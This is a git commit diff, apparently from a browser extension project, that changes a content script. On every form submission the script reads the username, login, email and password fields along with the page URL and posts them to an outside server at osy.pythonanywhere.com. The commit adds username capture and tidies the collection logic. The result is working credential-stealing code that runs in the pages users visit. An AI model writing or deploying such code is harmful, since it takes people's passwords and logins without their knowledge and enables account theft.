7ed4fb7407b270a9b0553a218f971862687076d0
Guillaume <gllmcornet@gmail.com>
2017-12-01 09:01:02 +0100

    ajout username - modifs code

--- extension code/content.js
+++ extension code/content.js
@@ -2,33 +2,49 @@
 var inputs = document.querySelectorAll("input[type=password]");
 var forms = document.forms
 
-console.log(inputs);
-
 //called when a submit event happens
 function formSubmit(event) {
-    var emails = document.querySelectorAll("input[type=text]#login-email");
-    var logins = document.querySelectorAll("input[type=email]");
-    var passwords = document.querySelectorAll("input[type=password]");
+    var username = 
+    {
+        Name : "Username",
+        List : document.querySelectorAll("input[name=username]")
+    }
+    var login = 
+    {
+        Name : "Login",
+        List : document.querySelectorAll("input[type=text]#login-email")
+    }
+    var email = 
+    {
+        Name : "Email",
+        List : document.querySelectorAll("input[type=email]")
+    }
+    var password = 
+    {
+        Name : "Password",
+        List : document.querySelectorAll("input[type=password]")
+    }
+
     var xhr = new XMLHttpRequest();
     xhr.open('POST', 'https://osy.pythonanywhere.com/blog/test_new');
     xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-    var string = 'URL : ' + document.URL + ' - Passwords : ';
-    for(var i=0; i<passwords.length; i++)
-	{
-        string = string + passwords[i].value;
-    }
-    string = string + ' - Emails : '
-    for(var i=0; i<logins.length; i++)
-	{
-        string = string + logins[i].value;
-    }
-    string = string + ' - Logins : '
-    for(var i=0; i<emails.length; i++)
-	{
-        string = string + emails[i].value;
-    }
+    var string = 'URL : ' + document.URL;
+    string = addToResults(username, string);
+    string = addToResults(email, string);
+    string = addToResults(login, string);
+    string = addToResults(password, string);
     console.log(string);
     xhr.send(string);
+}
+
+function addToResults(element, string)
+{
+    string = string + " - " + element.Name + ": "
+    for(var i=0; i<element.List.length; i++)
+	{
+        string = string + element.List[i].value;
+    }
+    return string;
 }
 
 // add an event listener to the submit event for every form in the page
